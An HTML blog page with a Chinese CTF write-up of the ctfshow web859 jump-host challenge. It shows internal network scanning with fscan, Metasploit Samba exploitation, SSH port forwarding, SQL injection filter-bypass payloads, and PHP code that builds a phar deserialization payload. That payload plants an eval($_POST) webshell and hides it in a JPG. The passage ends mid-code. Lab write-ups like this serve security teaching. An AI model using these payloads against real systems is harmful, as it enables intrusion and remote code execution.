<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="ssh搭建代理学习"><title>ctfshowweb859_有跳板机</title><link rel=canonical href=https://baozongwi.xyz/p/ctfshow-web859-with-jumpbox/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="ctfshowweb859_有跳板机"><meta property='og:description' content="ssh搭建代理学习"><meta property='og:url' content='https://baozongwi.xyz/p/ctfshow-web859-with-jumpbox/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='内网渗透'><meta property='article:published_time' content='2025-03-19T08:49:53+00:00'><meta property='article:modified_time' content='2025-03-19T08:49:53+00:00'><meta name=twitter:title content="ctfshowweb859_有跳板机"><meta name=twitter:description content="ssh搭建代理学习"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#外网>外网</a></li><li><a href=#内网代理搭建>内网代理搭建</a></li><li><a href=#内网getshell>内网getshell</a></li><li><a href=#ssh搭建多层代理>ssh搭建多层代理</a></li><li><a href=#fix>fix</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/ctfshow/>Ctfshow</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/ctfshow-web859-with-jumpbox/>ctfshowweb859_有跳板机</a></h2><h3 class=article-subtitle>ssh搭建代理学习</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2025-03-19T08:49:53Z>Mar 19, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>3 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
</span><span>友情提示：本文最后更新于 337 天前，文中的内容可能已有所发展或发生改变。</span></div><h2 id=外网>外网</h2><p>密码可以猜到是ctfshow，链接上来之后先把shell变成交互的，并且发现是普通用户，那用权限新开一个shell，再交互一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sudo -s
</span></span><span class=line><span class=cl>python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/ctfshow-web859-with-jumpbox/QQ20250319-090014.jpg width=768 height=153 loading=lazy alt=1></p><p>并且发现这里面根本找不到flag，把fscan传上去，扫一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>curl http://156.238.233.9/fscan
</span></span></code></pre></td></tr></table></div></div><p>结果一看不可以，回头想起来，环境不出网，那就scp给传上去吧</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>scp -P 28110 fscan ctfshow@pwn.challenge.ctf.show:/tmp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>cd /tmp
</span></span><span class=line><span class=cl>ifconfig
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>./fscan -h 172.2.190.4/24
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌──────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│    ___                              _        │
</span></span><span class=line><span class=cl>│   / _ \     ___  ___ _ __ __ _  ___| | __    │
</span></span><span class=line><span class=cl>│  / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ /    │
</span></span><span class=line><span class=cl>│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │
</span></span><span class=line><span class=cl>│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
</span></span><span class=line><span class=cl>└──────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>      Fscan Version: 2.0.0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[2025-03-19 09:10:00] [INFO] 暴力破解线程数: 1
</span></span><span class=line><span class=cl>[2025-03-19 09:10:00] [INFO] 开始信息扫描
</span></span><span class=line><span class=cl>[2025-03-19 09:10:00] [INFO] CIDR范围: 172.2.190.0-172.2.190.255
</span></span><span class=line><span class=cl>[2025-03-19 09:10:00] [INFO] 生成IP范围: 172.2.190.0.%!d(string=172.2.190.255) - %!s(MISSING).%!d(MISSING)
</span></span><span class=line><span class=cl>[2025-03-19 09:10:00] [INFO] 解析CIDR 172.2.190.4/24 -&gt; IP范围 172.2.190.0-172.2.190.255
</span></span><span class=line><span class=cl>[2025-03-19 09:10:00] [INFO] 最终有效主机数量: 256
</span></span><span class=line><span class=cl>[2025-03-19 09:10:00] [INFO] 开始主机扫描
</span></span><span class=line><span class=cl>[2025-03-19 09:10:00] [SUCCESS] 目标 172.2.190.4     存活 (ICMP)
</span></span><span class=line><span class=cl>[2025-03-19 09:10:00] [SUCCESS] 目标 172.2.190.1     存活 (ICMP)
</span></span><span class=line><span class=cl>[2025-03-19 09:10:00] [SUCCESS] 目标 172.2.190.5     存活 (ICMP)
</span></span><span class=line><span class=cl>[2025-03-19 09:10:01] [SUCCESS] 目标 172.2.190.6     存活 (ICMP)
</span></span><span class=line><span class=cl>[2025-03-19 09:10:01] [SUCCESS] 目标 172.2.190.7     存活 (ICMP)
</span></span><span class=line><span class=cl>[2025-03-19 09:10:01] [SUCCESS] 目标 172.2.190.2     存活 (ICMP)
</span></span><span class=line><span class=cl>[2025-03-19 09:10:01] [SUCCESS] 目标 172.2.190.3     存活 (ICMP)
</span></span><span class=line><span class=cl>[2025-03-19 09:10:03] [INFO] 存活主机数量: 7
</span></span><span class=line><span class=cl>[2025-03-19 09:10:03] [INFO] 有效端口数量: 233
</span></span><span class=line><span class=cl>[2025-03-19 09:10:04] [SUCCESS] 端口开放 172.2.190.5:80
</span></span><span class=line><span class=cl>[2025-03-19 09:10:04] [SUCCESS] 端口开放 172.2.190.4:22
</span></span><span class=line><span class=cl>[2025-03-19 09:10:04] [SUCCESS] 端口开放 172.2.190.6:139
</span></span><span class=line><span class=cl>[2025-03-19 09:10:04] [SUCCESS] 端口开放 172.2.190.6:445
</span></span><span class=line><span class=cl>[2025-03-19 09:10:04] [SUCCESS] 端口开放 172.2.190.5:9000
</span></span><span class=line><span class=cl>[2025-03-19 09:10:04] [SUCCESS] 服务识别 172.2.190.4:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]
</span></span><span class=line><span class=cl>[2025-03-19 09:10:09] [SUCCESS] 服务识别 172.2.190.5:9000 =&gt; 
</span></span><span class=line><span class=cl>[2025-03-19 09:10:09] [SUCCESS] 服务识别 172.2.190.5:80 =&gt; [http] 版本:1.18.0 产品:nginx
</span></span><span class=line><span class=cl>[2025-03-19 09:11:04] [SUCCESS] 服务识别 172.2.190.6:139 =&gt; 
</span></span><span class=line><span class=cl>[2025-03-19 09:11:04] [SUCCESS] 服务识别 172.2.190.6:445 =&gt; 
</span></span><span class=line><span class=cl>[2025-03-19 09:11:04] [INFO] 存活端口数量: 5
</span></span><span class=line><span class=cl>[2025-03-19 09:11:04] [INFO] 开始漏洞扫描
</span></span><span class=line><span class=cl>[2025-03-19 09:11:04] [INFO] 加载的插件: ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle
</span></span><span class=line><span class=cl>[2025-03-19 09:11:04] [SUCCESS] 网站标题 http://172.2.190.5        状态码:200 长度:2880   标题:欢迎登陆CTFshow文件管理系统
</span></span><span class=line><span class=cl>[2025-03-19 09:11:04] [SUCCESS] NetBios 172.2.190.6     oa                                  Windows 6.1
</span></span><span class=line><span class=cl>[2025-03-19 09:11:04] [INFO] 系统信息 172.2.190.6 [Windows 6.1]
</span></span><span class=line><span class=cl>[2025-03-19 09:17:59] [SUCCESS] 扫描已完成: 10/10
</span></span></code></pre></td></tr></table></div></div><p><code>172.2.42.6</code>开启了139和445端口
139端口是为‘NetBIOS SessionService’提供的，主要用于提供windows文件和打印机共享以及UNIX中的Samba服务。445端口也用于提供windows文件和打印机共享，在内网环境中使用的很广泛。这两个端口同样属于重点攻击对象，139/445端口曾出现过许多严重级别的漏洞。下面剖析渗透此类端口的基本思路。
（1）对于开放139/445端口的主机，一般尝试利用溢出漏洞对远程主机进行溢出攻击，成功后直接获得系统权限。利用msf的ms-017永恒之蓝。
（2）对于攻击只开放445端口的主机，黑客一般使用工具‘MS06040’或‘MS08067’.可使用专用的445端口扫描器进行扫描。NS08067溢出工具对windows2003系统的溢出十分有效，工具基本使用参数在cmd下会有提示。
（3）对于开放139/445端口的主机，黑客一般使用IPC$进行渗透。在没有使用特点的账户和密码进行空连接时，权限是最小的。获得系统特定账户和密码成为提升权限的关键了，比如获得administrator账户的口令。
（4）对于开放139/445端口的主机，可利用共享获取敏感信息，这也是内网渗透中收集信息的基本途径。</p><p>因为本地有msf的安装包，所以这里不用搭建代理，安装之后直接用msf打一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>msfconsole
</span></span><span class=line><span class=cl>use exploit/linux/samba/is_known_pipename
</span></span><span class=line><span class=cl>set rhost 172.2.190.6
</span></span><span class=line><span class=cl>exploit 
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/ctfshow-web859-with-jumpbox/QQ20250319-092951.jpg width=1094 height=508 loading=lazy alt=1></p><p>由于靶机不出网，所以需要搭建一个正向代理，我们把stowaway传上去</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>scp -P 28110 linux_x64_agent ctfshow@pwn.challenge.ctf.show:/tmp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>chmod +x linux_x64_agent
</span></span><span class=line><span class=cl>./linux_x64_agent -l 9999 -s 123
</span></span></code></pre></td></tr></table></div></div><p>然后在自己的服务器上面运行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>./linux_x64_admin -c 172.2.190.4:9999 -s 123
</span></span></code></pre></td></tr></table></div></div><h2 id=内网代理搭建>内网代理搭建</h2><p>貌似没有成功，用ssh来搭建</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ssh -L 8085:172.2.190.5:80 ctfshow@pwn.challenge.ctf.show -p 28110
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/ctfshow-web859-with-jumpbox/QQ20250319-094521.jpg width=1611 height=737 loading=lazy alt=1></p><h2 id=内网getshell>内网getshell</h2><p><img src=/p/ctfshow-web859-with-jumpbox/QQ20250319-094557.jpg width=1743 height=940 loading=lazy alt=1></p><p>这个命令做的就是把<code>172.2.190.5:80</code>的流量转发到本地的8085端口，所以我们访问本地的8085就有web服务了，源码泄露，拿到代码</p><p><img src=/p/ctfshow-web859-with-jumpbox/QQ20250319-095409.jpg width=1021 height=651 loading=lazy alt=1></p><p>直接插入，进行查询，但是</p><p><img src=/p/ctfshow-web859-with-jumpbox/QQ20250319-095436.jpg width=520 height=198 loading=lazy alt=1></p><p>过滤了部分东西，我之前以为没啥用这个，后面发现这些url编码在sql里面都用不了，</p><p><img src=/p/ctfshow-web859-with-jumpbox/QQ20250319-095624.jpg width=864 height=585 loading=lazy alt=1></p><p>在这里发现email没被用，那注入试试？</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#39;union/**/select/**/1--+@qq.com
</span></span></code></pre></td></tr></table></div></div><p>这样子的payload可以绕过，但是始终没有回显，回显发现<code>--</code>不能注释要用<code>#</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#39;union/**/select/**/1#@qq.com
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&#39;union/**/select/**/username/**/from/**/user#@qq.com
</span></span><span class=line><span class=cl>&#39;union/**/select/**/password/**/from/**/user#@qq.com
</span></span></code></pre></td></tr></table></div></div><p>表什么的都不好查，直接猜，<code>users</code>和<code>user</code>，最后查出<code>ctfshow\ctfshase????</code></p><p>进去之后可以上传文件，看代码，发现可以打phar反序列化</p><p><img src=/p/ctfshow-web859-with-jumpbox/QQ20250319-101041.jpg width=891 height=351 loading=lazy alt=1></p><p><img src=/p/ctfshow-web859-with-jumpbox/QQ20250319-101052.jpg width=462 height=138 loading=lazy alt=1></p><p>只要我们在email里面插入恶意代码，把exit闭合了，最后的写入语句就是这样</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>file_put_contents(&#34;../mail_cache/cache.php&#34;,&#34;&lt;?php exit(&#39;你好，下面是你的重置密码链接，请复制到浏览器地址栏打开.http://xxx.com/?token=xxxx&amp;email=&#39;.eval(\$_POST[1]))//&#39;);?&gt;&#34;);
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>action</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$email</span><span class=o>=</span><span class=s2>&#34;&#39;.eval(</span><span class=se>\$</span><span class=s2>_POST[1]))//&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;shell.phar&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>action</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Phar</span><span class=p>(</span><span class=s2>&#34;shell.phar&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setMetadata</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span> <span class=o>-&gt;</span> <span class=na>setStub</span><span class=p>(</span><span class=s1>&#39;GIF89a&#39;</span><span class=o>.</span><span class=s1>&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s2>&#34;a.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;111&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p><img src=/p/ctfshow-web859-with-jumpbox/QQ20250319-102307.jpg width=1035 height=477 loading=lazy alt=1></p><p>这里进行触发，把phar文件后缀改一下，但是发现不能上传，好像是会检测内容，那要混在照片里面</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>action</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$email</span><span class=o>=</span><span class=s2>&#34;&#39;.eval(</span><span class=se>\$</span><span class=s2>_POST[1]))//&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;shell.phar&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>action</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Phar</span><span class=p>(</span><span class=s2>&#34;shell.phar&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setMetadata</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span> <span class=o>-&gt;</span> <span class=na>setStub</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;SU.jpg&#39;</span><span class=p>)</span><span class=o>.</span><span class=s1>&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s2>&#34;a.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;111&#34;</span><span class=p>);</span>
